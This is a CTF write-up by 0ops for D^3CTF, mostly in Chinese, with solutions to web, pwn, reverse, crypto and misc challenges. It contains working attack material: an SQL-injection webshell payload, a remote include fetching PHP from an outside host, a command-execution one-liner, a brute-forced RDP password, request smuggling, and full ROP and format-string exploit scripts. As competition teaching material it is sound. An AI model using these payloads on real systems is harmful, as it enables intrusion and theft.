# D^3CTF Writeup by 0ops
[TOC]

## WEB

### easyweb

Render_model.php中有如下代码
```
$username = $this->sql_safe($username);
$username = $this->safe_render($username);
```
sql_safe中有检测注入的代码，但safe_render将"{"、"}"替换成空，所以构造"uni{on sele}ct"即可注入
存在二次注入
注册payload：
```
username:' an{d 1=2 unio{n selec}t 0x7b7b7068707d7d73797374656d28245f4745545b2763275d293b7b7b2f7068707d7d-- -
password:123456
```
登录后访问
```http://cc08a9f6af.easyweb.d3ctf.io/index.php/user/index?c=/readflag%20/flag```

### fake onelinephp
题目的代码和hitcon 2018 one-line-php-challenge一样，首先考虑session包含，但是无法复现，主机是windows系统，猜不到临时文件目录。
随便扫扫发现.git泄露，用Git_Extract可以得到完整的git历史记录。发现hint1.txt、hint2.txt、dict.txt。大概意思是要用dict里的密码连接到内网机器上。题目中有include_path和allow_url_include的限制导致RCE不了，但是windows机器特有的UNC路径可以绕过这些限制。可以用smb或是webdav协议。

> http://7317da5e40.fakeonelinephp.d3ctf.io/?orange=//202.112.28.106@8980//webdav/ix.php

然后发现phpinfo可以执行，但一句话执行不了，可能是Windows Defender当成木马杀掉了。可以用这个绕过查杀:`@<?php system(file_get_contents("php://input"));?>`，可执行任意命令。`ping 172.19.97.8`，内网是通的，接下来就是下载文件开3389端口转发，暴破内网rdp：
```
[8389][rdp] host: 172.19.97.8   login: Administrator   password: eDHU27TlY6ugslV
```
得到flag：d3ctf{Sh3ll_fr0m_ur1111_inc1ude!1!!!_soCoooool}

### showhub
sprintf注入
payload:
```
username= hhh%1$',%1$'1%1$')#&password=xxx
```
查本表数据：
```
(select group_concat(password) from  (select * from user) as uuuser)
```
注出来的数据有

```
user():root@172.22.0.4
database:app
table:user
col:id,username,password
admin/sha256的密码（解不出来）
```
根据
https://dev.mysql.com/doc/refman/8.0/en/insert-on-duplicate.html
尝试insert时改admin密码
payload:
```
username=aaaa%1$',%1$'123%1$'),(1,%1$'admin%1$',%1$'1%1$') ON DUPLICATE KEY UPDATE password=%1$'754d1742df785804dd0103993a915c3b3688dd87ea9f1915de9b4728eec02e8e%1$'#&password=test
```
可登陆成功
题目要求admin从内网访问，直接构造xff和clien-ip不太行
然后看到响应头里有ATS 7.1.2
可能有请求走私的问题
最后exp为
```
POST /WebConsoe/ HTTP/1.1
Host: bcad3a6b2d.showhub.d3ctf.io
Cookie: PHPSESSID=rnjnm7u9fcqq4u91utdsnd7fds
Content-Length: 2765
Transfer-Encoding: chunked

0

POST /WebConsole/exec HTTP/1.1
Host: bcad3a6b2d.showhub.d3ctf.io
Client-Ip: 172.22.0.4
Cookie: PHPSESSID=rnjnm7u9fcqq4u91utdsnd7fds
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 70

cmd=cat /flag;
```

### babyxss
虽然没有在结束前做完，还是记录一下。
根据提示，很容易搜到一篇关于pnacl的xss文章，https://shhnjk.blogspot.com/2019/07/intro-to-chromes-gold-features.html
由于是chrome78，需要注册一个token放在head的meta中，然后引入pnacl的payload（csp中object-src未设置，所以没有限制）。payload按照链接中的poc改一改重新编译即可，注意放payload的服务器需要有CORS头

## PWN

### unprintableV
将stdout指针修改为stderr，leak地址后将time改为很大，无限printf修改栈上的值，rop
```python
from pwn import *
e=ELF("./libc.so.6")
context.log_level='debug'
while 1:
    try:
        #p=process("./unprintableV")
        p=remote('212.64.44.87',18898)
        p.recvuntil('here is my gift: ')
        stack=int(p.recvline(),16)
        p.recv()
        print hex(stack)
        if stack%0x10000>0x2000:
            raise BaseException
        p1="%"+str(stack%0x10000)+"c%17$hn"
        p.send(p1.ljust(300,'\x00'))
        p2="%32c%43$hhn"
        p.send(p2.ljust(300,'\x00'))
        p3="%1664c%9$hn"
        p.send(p3.ljust(300,'\x00'))
        p.send("AAAA".ljust(300,'\x00'))
        if 'AAAA' not in p.recvuntil('AAAA',timeout=1):
            raise BaseException
    except:
        p.close()
    else:
        print 'Suceess'
        break
p.sendline('libc:%31$p\nmain:%7$p\n')
p.recvuntil('libc:')
libc=int(p.recvuntil('\n'),16)-4114384-85859
p.recvuntil('main:')
main=int(p.recvuntil('\n'),16)-2811
print "libc:"+hex(libc)
print "main:"+hex(main)
#p1="%1888c%9$hn"
#p.send(p1.ljust(8,'\x00'))
p2="%16c%43$hhn"
p.send(p2.ljust(300,'\x00'))
p3="%1000c%9$hn"
p.send(p3.ljust(300,'\x00'))
def write(towritten,con):
    for j in range(8):
        wri=con%0x100
        con/=0x100
        _=towritten+j
        for i in range(8):
            __=_%0x100
            _/=0x100
            p1="%"+str(stack%0x100+i)+"c%17$hhn"
            p.send(p1.ljust(300,'\x00'))
            if __==0:
                p1="%43$hhn"
            else:
                p1="%"+str(__)+"c%43$hhn"
            p.send(p1.ljust(300,'\x00'))
        p2=""
        if wri==0:
            p2="%9$hn"
        else:
            p2="%"+str(wri)+"c%9$hhn"
        p.send(p2.ljust(300,'\x00'))
write(stack+0x10,libc+0x3960)
write(stack+0x18,main+0x202070)
#attach(p,"b"+"*"+str(libc+0x3960))
rop="d^3CTF".ljust(8,'\x00')
rop+='flag'
rop=rop.ljust(16,'\x00')
rop+=p64(main+0xbc3)
rop+=p64(main+0x202068)
rop+=p64(main+0xbc1)
rop+=p64(0)
rop+=p64(0)
rop+=p64(libc+e.symbols['open'])
rop+=p64(main+0xbc3)
rop+=p64(1)
rop+=p64(main+0xbc1)
rop+=p64(main+0x202800)
rop+=p64(0)
rop+=p64(libc+0x1b96)
rop+=p64(100)
rop+=p64(libc+e.symbols['read'])
rop+=p64(main+0xbc3)
rop+=p64(2)
rop+=p64(main+0xbc1)
rop+=p64(main+0x202800)
rop+=p64(0)
rop+=p64(libc+0x1b96)
rop+=p64(100)
rop+=p64(libc+e.symbols['write'])
rop+=p64(main+0xbc3)
rop+=p64(0)
rop+=p64(libc+e.symbols['exit'])
print len(rop)
p.send(rop.ljust(300,'\x00'))
p.interactive()
```

### babyrop
一个栈虚拟机，核心函数sub_1056  
stack_top初始在sub_1056的rbp-60h位置  

switch-case中几个有用的指令：  
* \x28：stack_top += 0x50，是唯一能够抬高栈的指令（ida逆向显示return，但是看汇编和调试，实际上是break。如果是return，这条指令就不能用了）
* \x34：stack_top -= 8; \*(long \*)stack_top=\*(stack_top+8); \*(stack_top+8)=0，把栈顶的值向下移动
* \x21：\*(long \*)stack_top += \*(long \*)(stack_top-8); \*(stack_top-8)=0，让栈顶的值加上栈顶下方的值
* \x56+p32(const)：\*(long \*)stack_top = (int)const，把栈顶的值设为任意int范围的数
* \x00：从sub_1056函数return

第一次switch时栈的情况：  
```
pwndbg> p /x $pc
$1 = 0x555555555409
pwndbg> stack 0x20
00:0000│ rsp  0x7fffffffe130 —▸ 0x555555756148 (__bss_start+312) ◂— 0x0
01:0008│      0x7fffffffe138 —▸ 0x555555756150 (__bss_start+320) —▸ 0x7fffffffe150 ◂— 0x0
02:0010│      0x7fffffffe140 —▸ 0x555555756140 (__bss_start+304) ◂— 0x0
03:0018│      0x7fffffffe148 —▸ 0x555555756040 (__bss_start+48) ◂— 0x333231 /* '123' */
04:0020│      0x7fffffffe150 ◂— 0x0
... ↓
0e:0070│ rdi  0x7fffffffe1a0 ◂— 0x100000003
0f:0078│      0x7fffffffe1a8 ◂— 0x506c28d9a8640d00
10:0080│ rbp  0x7fffffffe1b0 —▸ 0x7fffffffe1d0 —▸ 0x555555555430 ◂— push   r15
11:0088│      0x7fffffffe1b8 —▸ 0x555555554977 ◂— mov    edi, 0
12:0090│      0x7fffffffe1c0 —▸ 0x7fffffffe2b0 ◂— 0x1
13:0098│      0x7fffffffe1c8 ◂— 0x506c28d9a8640d00
14:00a0│      0x7fffffffe1d0 —▸ 0x555555555430 ◂— push   r15
15:00a8│      0x7fffffffe1d8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
16:00b0│      0x7fffffffe1e0 ◂— 0x1
17:00b8│      0x7fffffffe1e8 —▸ 0x7fffffffe2b8 —▸ 0x7fffffffe576 ◂— '/home/ctf/babyrop'
18:00c0│      0x7fffffffe1f0 ◂— 0x1f7ffcca0
... ↓
```
此时  
stack_top = 0x7fffffffe150  
sub_1056的返回地址在0x7fffffffe1b8  
__libc_start_main_ret在0x7fffffffe1d8  

libc 2.23 中的偏移量：  
__libc_start_main_ret	0x020830  
onegadget [rsp+0x30] == NULL 0x4526a  
相差0x24a3a  

利用：
1. 0x28 两次，把stack_top抬升到0x7fffffffe1f0
2. 0x56+p32(0) 一次，把*0x7fffffffe1f0设为0
3. 0x34 两次，把stack_top降低到0x7fffffffe1e0
4. 0x56+p32(0x24a3a) 一次，把*0x7fffffffe1e0设为0x24a3a
5. 0x21 一次，*0x7fffffffe1e0 += *0x7fffffffe1d8，正好是__libc_start_main_ret+0x24a3a=onegadget
6. 0x34 五次，把*0x7fffffffe1b8设为onegadget
7. 0x00，从sub_1056（0x7fffffffe1b8）return，此时*(rsp+0x30)=*0x7fffffffe1e8=0，满足onegadget的条件

exp：
```
echo -e "\x28\x28\x56\x00\x00\x00\x00\x34\x34\x56\x3a\x4a\x02\x00\x21\x34\x34\x34\x34\x34\x00\ncat flag" | nc 106.54.67.184 16247
```

## REVERSE

### Machine
apk中提取so发现初始化时定义了verify函数，调用两次XTEA加密，第一次轮数为32，密钥是通过idleonce函数生成的一个数组的第8-11个int，逆向分析发现该函数生成的数组每一项都是前一项的两倍加3，得到密钥为[2045, 4093, 8189, 16381]，第二次轮数为64，密钥有所修改，为[1107, 4093, 0x7FFFD, 0x3FFFD]，其中1107只有通过了各种反调试检查才能正确得到（纯静态分析的就看看），对密文解密即可得到flag，`BypA55_W3lL-D0ne`

### easy dongle
逆向elf发现它会和固件通信，收固件发的8字节数据，异或解密之后再发回去，而后接收一个格式魔改过的ELF文件并执行其函数；固件为stm32，32bit小端arm，加载地址为0x08000000，开头为栈地址和中断向量表，从后者可以找到起始执行位置，从而定位关键逻辑，发现发送的8字节为其MCU的ID，从程序中的判断条件可以看出该值。而ELF解密后的8字节会被作为DES密钥以CBC模式解密一段数据，即新的ELF，IV为`D3CTF{0}`。新ELF里直接搜字符串就可以看到flag了

### ch1pfs
patch CH1P_fs.ko，定位waifu.png的密文，提取出来，恢复出f_key，解密key，拿到key`d3_CH1pfs!`，进入文件系统，发现flag被enc加密，enc被rm掉了，手动提取出enc，用f_key解密，稍加分析得flag: `d3ctf{Do_you_think_vfs_1s_convenient}`

### KeyGenMe
用了MIRACL大数运算库，恢复函数名，发现DSA算法，pqgyrsk都有，推出私钥x，得`flag`的s，修改signed.out即可。

### Ancient Game V2
用Python重新实现js里的m_vrun函数，在每轮while循环中打印一些信息帮助分析程序的逻辑  

第一次调用m_vrun时ip=0，作用是打印banner，可以忽略  

第二次调用m_vrun时ip=19649，参数是输入的字符串  
while循环中a>0 and b<0条件时从input_buffer取输入，共50次，所以输入长度是50  
随便给一个输入，发现最终打印出"Sorry, please try again."。观察控制流中和output_buffer相关的ip(a<=0 and b<0)，发现只要ip跳到116723，就开始打印这句话。（将ip直接改为116723调用m_vrun，证实了这一点）  

因此目标是不让程序的ip进入116723  

分析程序  
第一阶段：从input_buffer取数字，然后用两次 与非 复制到另一个地方。  
第二阶段：逐一取第一阶段保存的输入值，与一些常量进行 与非 运算，然后进入分支选择。  
（产生分支的情况：b>=0而且是一个有效的ip，此时a<=0和a>0会走向不同的分支）  
这些地方的b都是116723，通过跟踪50个输入值在数据流中的传递发现a是从输入值经过运算得到的值。添加约束a>0，不让ip跳过去  
在m_vrun中把不满足条件的a强行修改，让程序可以继续执行下去  

第三阶段：  
强行修改上面的a之后程序还是会进入116723，而且这些分支的a不受输入值的影响。从第一个进入116723的分支向上追溯控制流，找到最近的一个a受到输入值影响的分支，发现这个分支的a>0，没有跳到b的位置。  
提取这个b的值，尝试直接将ip直接改为该值调用m_vrun，发现程序打印出了"Correct."  
发现第三阶段控制流有多次跳转到这个b值的机会，但是如果添加约束a<=0让它第一次遇到就跳转，最后会unsat。所以添加约束：在这些遇到b值的地方，至少要有一次a<=0（不一定是第一次）  
对于50个输入值，每个输入值都有一个这样的b值，手动提取出来  

最终exp：
```
from z3 import *
from mem import m_mem

ip = 0

def nand(a, b):
    return ~(a & b)

def m_vrun(input_buffer, symbol_input_buffer):
    global ip
    global s
    global symbol_mem
    if (ip == 0):
        input_buffer = ''
    input_buffer = list(input_buffer)
    input_buffer.reverse()
    symbol_input_buffer = list(symbol_input_buffer)
    symbol_input_buffer.reverse()
    output_buffer = ''
    loop = 0
    while True:
        loop += 1
        if (ip >= len(m_mem)):
            output_buffer += '\n\nPress (Enter) to reload.'
            break
        a = m_mem[ip]
        symbol_a = symbol_mem[ip]
        ip += 1
        b = m_mem[ip]
        symbol_b = symbol_mem[ip]
        ip += 1
        if (b == 116723):
            global taint
            #print ip-2
            for i in xrange(50):
                if i in taint[ip-2]:
                    s.add(And(symbol_a & 0x80 == 0, symbol_a != 0))    # a>0
                    break
            if a <= 0:
                a = 99999999
        global right_paths
        if (b in right_paths):
            for i in xrange(50):
                if i in taint[ip-2]:
                    index = right_paths.index(b)
                    symbols_to_right_paths[index].append(symbol_a)
                    break
        if (a <= 0):
            if (b >= 0):    # a<=0 and b>=0  -0 +0
                ip = b
                continue
            else:    # a<=0 and b<0  -0 -
                c = m_mem[ip]
                symbol_c = symbol_mem[ip]
                ip += 1
                #output_buffer += chr(m_mem[c])
        else:    # a > 0
            if (b < 0):    # a>0 and b<0  + -
                if (len(input_buffer) == 0):
                    ip -= 2
                    break
                global input_count
                taint[a] = set([input_count])
                input_count += 1
                m_mem[a] = input_buffer.pop()
                symbol_mem[a] = symbol_input_buffer.pop()
            else:    # a>0 and b>=0  + +0
                c = m_mem[ip]
                symbol_c = symbol_mem[ip]
                ip += 1
                if (c >= 0):
                    taint[c] = taint[a].union(taint[b])
                    m_mem[c] = nand(m_mem[a], m_mem[b])
                    symbol_mem[c] = nand(symbol_mem[a], symbol_mem[b])
    return output_buffer

s = Solver()
k = [ BitVec("k%d"%(i,), 8) for i in xrange(50) ]

symbol_mem = list(m_mem)

debug = 0
ip = 19649
input_count = 0
taint = [set([_]) for _ in xrange(len(m_mem))]

right_paths = [
    115776, 83325, 76263, 166097, 41424,    # 0-4
    54693, 23760, 189823, 167125, 94849,    # 5-9
    55581, 167473, 142470, 84302, 30457,    # 10-14
    135574, 148097, 35452, 84086, 40144,    # 15-19
    193376, 173107, 133840, 30224, 69714,    # 20-24

    107039, 23040, 128482, 192620, 116504,    # 25-29
    105755, 103356, 126785, 59198, 62072,    # 30-34
    55323, 73954, 86705, 37945, 118646,    # 35-39
    33955, 112509, 96838, 88408, 25467,    # 40-44
    56210, 86807, 147024, 177045, 88822    # 45-49
]        # manually find these ...

symbols_to_right_paths = [list() for _ in xrange(50)]


ns = [ord("\0") for _ in xrange(50)]

ns[0] = ord("d")
ns[1] = ord("3")
ns[2] = ord("c")
ns[3] = ord("t")
ns[4] = ord("f")
ns[5] = ord("{")

for i in xrange(50):
    s.add(Or(Or(And(k[i]>=33, k[i]<=126), k[i]==0), k[i]==10))
    pass

for i in xrange(6):
    s.add(k[i] == ns[i])
s.add(k[49] == ord("}"))

m_vrun(ns, k)

for symbols in symbols_to_right_paths:
    cond = None
    for symbol in symbols:
        tmp = Or(symbol & 0x80 != 0, symbol == 0)    # a<=0
        if cond == None:
            cond = tmp
        else:
            cond = Or(cond, tmp)
    if cond != None:
        s.add(cond)
        #print cond

print s.check()    # sat

m=s.model()
#print m
flag = ""
for i in xrange(50):
    num = m[k[i]].as_long()
    flag += chr(num)

print flag

```

## CRYPTO

### noise
先找一个a满足a+e=s(e即noise，s即secret),再取一个略小于s/e的k，如$2^{22}$，发送k\*a，则有$ka+e=(k-1)s+a1$，两边同除以k-1即可将noise减小为1/k，如此反复，noise可减为1，即可得到s，脚本如下
```python
#!/usr/bin/env python
# coding=utf-8

from pwn import *
import random

# context.log_level = 'debug'

def randn(n):
    return random.randint(1, (1<<n)-1)

def test(n):
    global r
    r.sendline('god')
    r.sendline(str(n))
    return int(r.recvline().strip())

def guess(n):
    global r
    r.sendline('bless')
    r.sendline(str(n))
    log.info(r.recvline())

# r = process('./noise_6bf8bcee73.py')
r = remote('129.226.75.200', 30122)
log.info(r.recvline())
a = 1 << 1024
res = test(a)
if res > a:
    log.info('Fail!')
    r.close()
    exit(0)
res2 = test(a>>1)
if res2 < (a>>1):
    log.info('Fail!')
    r.close()
    exit(0)
a -= res
log.info("a: %x", a)

k = 1
for i in range(46):
    k <<= 22
    tmp = a * k
    res = test(tmp)
    a = (tmp - res) / (k - 1)
    log.info("a: %x", a)
guess(a+1)
```

### bivariate
参考曾经出过的一道三变量coppersmith题，脚本改改，构造方程为$f = (x * (1<<924) + p0 + y) * z$，其中x和y即我们要求的值，z即q，于是该方程模N即为0，脚本如下
```python
#!/usr/bin/env python
# coding=utf-8

from sage.all import *
from itertools import product

F = PolynomialRing(ZZ, names='x,y,z')
x, y, z = F.gens()

debug = 0

if debug:
    N = 15801398095963153678740257537746418701500792734178255086538988857817106754452589755835647443452104396692798928727071680992285314393939534885717915874210959848718533383313693279947141622183276991677603939221182108592506041805765335654661793454672824059845192463740874029305950722341680735523114608485594790376365594444405671652646619685479883098584221444583448535212382168818524428815346460366879451873055929024433851240812240959876065842924222612424262800791108519617515046715466105002478169084268735491016551184923375499976765782157870595340924272289389839134808828335878955050926701063932066938107531939127263868127
    p = 160826562449992609272632870762290834237857582852648245062316483163912625311131169356289585444328934329929021578684439555375696615773482106874136783307738147770088853586848048037418220268385666849314488080433958217561976027616347989446909110212067718570438233519594099635437479168287132377600107037520253381937
    p0 = 0xe8229e3cbf86e0b9f423edd90ddd0038754719c216040f328d6c8db1584fc0ee4c7cb83d53b22b847954387d759b2cedc3dd27a2d7e96356799b91f549e339797bebc0adbeea4218207036928dfd3c8b04c76c7e3eb8881e0937599fad1c066edc773f84357a600000000000000000000000000
    solx = 0xe5064df65ca95227dfd0638fa
    soly = 0x3007232cedc8dcd9304576d31
    solz = 98251171045681203182111272873122352905626669194241678334261367264962902400429009012068291134978449944742992482516319121732912547592701957435375533710086310557720059832564423639735420201314620395483105434144060769746464841434320420992799324356948086673379049345571374966386359645255985581413205850668176473871
    X = solx + 100
    Y = soly + 100
    Z = solz + 100
else:
    N = 29645777419353736043057269010272359991416746014481631913846394670078485669726163429148261773650808178885540922407769261977694870685655675641674238423494302502713669170229824386613320560323567408297922627498904721032641809270387608763375110868803588215842220559925272939588535929617335141314939188135485819647392547941664721198106918867256215010691258972314587355422307935800963252186373953902703756486263607531802422220243261067840601049386548437700448106992244972092205487949271972315893678254707578275422023764563404729727966134925789323455747715178318199560676511490769844114918905097088133071853897724375466871753
    p0 = 19994706539344817615577001340218084154374248082066669466133143688464179834710257290336770530283220217475114036198814696889289562075455713159534426021509764445583402971591173189115806435513627099657084735309947492280373743846773519959600992501216048618966605151951399747378479104
    X = 1 << 100
    Y = 1 << 100
    Z = 1 << 1024

f = (x * (1<<924) + p0 + y) * z

# polynomial is fine?
if debug:
    assert 0 == f.subs(x=solx, y=soly, z=solz) % N
    assert 0 != f.subs(x=solx+1, y=soly, z=solz) % N
    assert 0 != f.subs(x=solx, y=soly+1, z=solz) % N
assert 0 != f.subs(x=123, y=31337, z=1337)

# [!] configurable parameters, by hand...
mm = 4
tt = 1

# generate polynomials for lattice
polys = []

for kk in range(mm+1):
    for ii in range(mm+1-kk):
        for jj in range(mm+1-kk-ii):
            poly = x^ii * z^jj * f^kk * N^(mm-kk)
            polys.append(poly)

for kk in range(mm+1):
    for ii in range(mm+1-kk):
        for jj in range(mm+1-kk-ii):
            poly = x^ii * y^jj * f^kk * N^(mm-kk)
            polys.append(poly)

for jj in range(1, tt+1):
    for kk in range(floor(mm/tt)*jj, mm+1):
        for ll in range(kk+1):
            poly = y^jj * z^(kk-ll) * f^ll * N^(mm-ll)
            polys.append(poly)

polys = sorted(polys)
monomials = []
for poly in polys:
    monomials += poly.monomials()
monomials = sorted(set(monomials))
# print '[+]list of monomials:', monomials
print len(monomials), len(polys)
# assert len(monomials) == len(polys)
dim1 = len(polys)
dim2 = len(monomials)
M = matrix(ZZ, dim1, dim2)
for ii in xrange(dim1):
    M[ii, 0] = polys[ii](0, 0, 0)
    for jj in xrange(dim2):
        if monomials[jj] in polys[ii].monomials():
            M[ii, jj] = polys[ii].monomial_coefficient(monomials[jj]) * monomials[jj](X, Y, Z)
print ''
print '=' * 128
print ''

B = M.LLL()

PS.<xs, ys> = PolynomialRing(QQ)
hs = []
for ii in range(dim1):
    pol = 0
    for jj in range(dim2):
        pol += monomials[jj](xs, ys, 1) * B[ii, jj] / monomials[jj](X, Y, Z)
    # assert pol(xs=solx, ys=soly) % N == 0
    # if pol != 0 and pol(xs=solx, ys=soly) == 0:
    if pol != 0 and len(hs) < 5:
        print "Got poly with good root over ZZ. (Vector %d)" % ii
        hs.append(pol)

for i in hs:
    print i.monomials()
pset = PS.ideal(hs)
# assert pset.dimension() == 0
print pset.dimension()
print "[+]Well done! It's solvable!"
proot = pset.variety()[0]
print "[+]Got root:", proot
if debug:
    print solx, soly
    print p
p = (proot[xs] * (1<<924) + p0 + proot[ys])
print p
print N%p
```

### Common
Coppersmith解出hint：3-540-46701-7_14 or 2009/037。![](https://hackmd.0ops.sjtu.cn/uploads/upload_a801551fd8eb95e504caf2ae479cb323.png)
按照第一篇论文里的方法构造矩阵$L_2$格规约(保证等式的右边位数相近)，用格规约结果的第一行与$L_2$解出$k_1k_2$和$d_1gk_2$，计算$\frac{d_1gk_2}{gcd(k_1k_2, d_1gk_2)}$，因为$k_1$和$d_1g$可能不互素，得到的结果是d与一个真分数的乘积。可以通过枚举分别求出分子分母，从而计算d。已知e，d可以求出p，q。

```python
'''
n = 22752894188316360092540975721906836497991847739424447868959786578153887300450204451741779348632585992639813683087014583667437383610183725778340014971884694702424840759289252997193997614461702362265455177683286566007629947557111478254578643051667900283702126832059297887141543875571396701604215946728406574474496523342528156416445367009267837915658813685925782997542357007012092288854590169727090121416037455857985211971777796742820802720844285182550822546485833511721384166383556717318973404935286135274368441649494487024480611465888320197131493458343887388661805459986546580104914535886977559349182684565216141697843
p0 = 165268930359949857026074503377557908247892339573941373503738312676595180929705525120390798235341002232499096629250002305840384250879180463692771724228098578839654230711801010511101603925719055251331144950208399022480638167824839670035053131870941541955431984347563680229468562579668449565647313503239028017367

p_part1 = p0 & (2**444-1)
p_part2 = (p0 >> (444+28*8)) << (444+28*8)
F.<x> = PolynomialRing(Zmod(n), implementation='NTL')

f = p_part1 + x*2**444 + p_part2

p_part3 = f.monic().small_roots(beta=0.4, X=2**224)[0]

known = (p0 >> 444) & (2**224-1)
print hex(known ^^ p_part3.lift()).decode("hex")
'''

n = 21449895719826316652446571946981952001870566997635249354839719104586793422147136850745824964669880149217071660375357131860682282796961273035757913027221984662855086934378108862417739678560641256025021177459341664799202908015371506818482697948776860635401930560813387486994329880316276005206046676604369818653109492798511157267685062757615124902736832428778894091595763452172598515654092085157566254905703036750059426372678012021690115369113601765685996153603249713637184151546264425226874180985930269362876845015270912918849008772950078638461376666258348157307814840090503490728994671500681702766815576953787813978261
e1 = 154876861410030193905637296965209391737518615267603515377282161163927291285967965497209788803884091512203071770629845496583933653022795932154979438702329298506942119286672966860218225280626597363420844895229952830077688654634909597435821159150203935892844897371875699700527646518533561853297444882053983227593488765684563676352563626896826395039059975553220690136832152388058883795799274080376167383757159656303732365134738082284498670076819991548527840704114978992615193815662908944493989239004523225764813567930483040425975604255002646785221221878939420219915361396619167751523362930788604016988652824182040859853
e2 = 402990417892531977850271294939175215561881274701367217938141276378027299932263277333257773304557909966758931404723788571151364295341508924840669170504985457120360059297598604537100046622550945605718236227573083837228605402001910225151380616962871923554321544941879414420770210243790557120014475150848993651449636282584509883109795086026235707304394495245201159365863786851663410631339564797425347542642297764418117149471025357391362626205617684148715868071334593025123520727806776519925478240637301296453177836917692916152818769174676318043128314246927769799960281108858830520315473333109470979129926160732972172081

m1 = 1 << 1024
m2 = 1 << (2048+700)
mat = [[n, -m1*n, 0, n^2], [0, m1*e1, -m2*e1, -e1*n], [0, 0, m2*e2, -e2*n], [0,0,0,e1*e2]]
L = matrix(mat)
B = L.LLL()
ans = B[0]*(~L)

k1 = abs(ans[0])
d1 = abs(ans[1])
kk = gcd(k1, d1)
d = d1 / kk

m = 42
c = pow(m, e1, n)
tmp = pow(c, d, n)
i = 1
while parent(pow(tmp, i, n).lift().log(m)) != ZZ:
    i+=1
tmp = pow(tmp, i, n).lift().log(m)
d = d / tmp
p = 1
q = 1
while p==1 and q==1:
    k = d * e1 - 1
    g = randint(0, n)
    while p==1 and q==1 and k % 2 == 0:
        k /= 2
        y = pow(int(g), int(k), int(n))
        if y !=1 and gcd(y-1, n) > 1:
            p = gcd(y-1, n)
            q = n / p
assert p * q == n

phi = (p-1)*(q-1)
d = inverse_mod(65537, phi)
c = 21037638775241935705441169753441969181214988969805330775013543248627632552311198450678114235819562675518919466977321520345880402152065754456138008928612618730995007509860931974158286638375767596664571588900873546529219194178268112698039853957041774843749061288696704191382908696861582667493389648259168539280602684104107043926115007135814623174879703368347247535365452080470946340175647350659950178146229633608967125085585415972497659100238875587736956198682668140956431794164348384880775647438732698709407480919045992477653549924142632962331437675488780736097081752111600358026119501809787360220615860538667734006333
m = pow(c, d, n).lift()
print hex(m).decode("hex")
```

### sign2win
对两条不同的消息签名，然后用一个公钥验证通过,还需要保证签名结果相同。r和s相同，k相同。任意选择k，可以计算此时两个私钥的差值。
$$h_1+r*d_1 \equiv h_2 + r*d_2\ mod\ n$$ $$d_2 - d_1 \equiv (h_1 - h_2)r^{-1}\ mod\ n$$ $$v_1 = [(h_1+rd_1)G]_x，v_2 = [(h_2+rd_1)G]_x$$ 两个v相同，考虑到椭圆曲线上一个横坐标对应两个点， $$h_1+h_2+2rd_1 \equiv 0\ mod\ n$$ $$d1\equiv (-h_1-h_2)(2r)^{-1}\ mod\ n$$ 至此两个d都计算出来了，可以保证签名相同并且可以被$d_1$对应的公钥验证

```python
from pwn import *
import re
import string

r = remote("129.226.163.141", 12233)
pattern = re.compile(r"sha256\(XXXX\+(\w+)\) == ([0-9a-f]+)")
suffix, result = re.findall(pattern, r.recv())[0]
answer = iters.bruteforce(lambda x:sha256sumhex(x+suffix)==result, string.digits+string.ascii_letters, 4, "fixed")
r.sendline(answer)
r.interactive()
'''
import hashlib
a = 0
b = 7
p = 115792089237316195423570985008687907853269984665640564039457584007908834671663L
E = EllipticCurve(Zmod(p), [a, b])
n = E.order()
g = (55066263022277343669578718895168534326250603453777594175500187360389116729240L, 32670510020758816978083085130507043184471273380659243275938904335757337482424L)
g = E(g)
m1 = "I want the flag"
m2 = "I hate the flag"
h1 = int(hashlib.sha256(m1).hexdigest(), 16)
h2 = int(hashlib.sha256(m2).hexdigest(), 16)

K = randint(1, n)
r = (g*K).xy()[0].lift()
dd = (h1-h2)*inverse_mod(r, n) % n
d1 = (-h1-h2) * inverse_mod(2*r, n) % n
d2 = (dd + d1) % n

pubkey1 = d1*g
pk1x = pubkey1.xy()[0]
pk1y = pubkey1.xy()[1]
pk =  hex(int(pk1x))[2:-1] + hex(int(pk1y))[2:-1]

s1 = (h1 + r*d1)*inverse_mod(K, n) % n
s2 = (h2 + r*d2)*inverse_mod(K, n) % n
assert s1 == s2
s = hex(r).zfill(64)+hex(s1).zfill(64)
print "pk: " + pk
print "s:  " + s
'''
```

### babyecc
满足源码条件的a是$2^{251}$(也可以直接两个点解出A和B)，发现N是两个素数乘积，分解之后构造两个椭圆曲线，每个曲线上p点的阶是多个小素数的乘积，可以直接Pohlig-Hellman+BSGS求解每条曲线上的d（直接用sage的discrete_log），然后crt得到N上的d。
```python
N = 45260503363096543257148754436078556651964647703211673455989123897551066957489
P = (44159955648066599253108832100718688457814511348998606527321393400875787217987,
     41184996991123419479625482964987363317909362431622777407043171585119451045333)
Q = (29408960086221366360303377895207383466408262326913281665475073883068913811245, 16767605826892592607157297849446627579968828319597447014637716335281880369304)

x1, y1 = P
x2, y2 = Q
t1 = y1^2 - x1^3 % N
t2 = y2^2 - x2^3 % N
A = (t1-t2)*inverse_mod((x1-x2), N) % N
B = (y1^2 - x1^3 - A*x1) % N

F = IntegerModRing(N)
E = EllipticCurve(F, [A, B])
P = E(P)
Q = E(Q)

n1 = 330430173928965171697344693604119928553
n2 = 136974486394291891696342702324169727113
assert n1 * n2 == N
e1 = EllipticCurve(Zmod(n1), [A, B])
e2 = EllipticCurve(Zmod(n2), [A, B])
p1 = e1(P)
q1 = e1(Q)
p2 = e2(P)
q2 = e2(Q)

d1 = p1.discrete_log(q1)
d2 = p2.discrete_log(q2)
message = hex(crt([d1,d2], [p1.order(), p2.order()])).decode("hex")
print "d3ctf{" + message + "}"
```

## MISC
### bet2loss_v2
前端页面下注时的流程：请求后端random拿到commit等->发送下注的交易->请求后端，后端发送开奖的交易
跳过下注的步骤直接开奖，可以看到reveal的值并不大，结合v1的源码确定范围是2^20^~2^30^。另外允许的时间是250个块（近1小时），于是请求一堆commit值，爆破任意4个
另外需要对区块号做预测，调高gasPrice就能在下一区块确认

### Vera
根据题目提示，使用VeraCrypt及书的ISBN解密出来一张图片，然后stegsolve看到移位后的图隐约有字母，经过观察后，按照2-4-2-4的规律把竖着的像素分开：
![](https://hackmd.0ops.sjtu.cn/uploads/upload_e545358b93c78d1181448206832d934d.png)
可以看到d3ctf{T1g3rTeAm}

### Find Me?
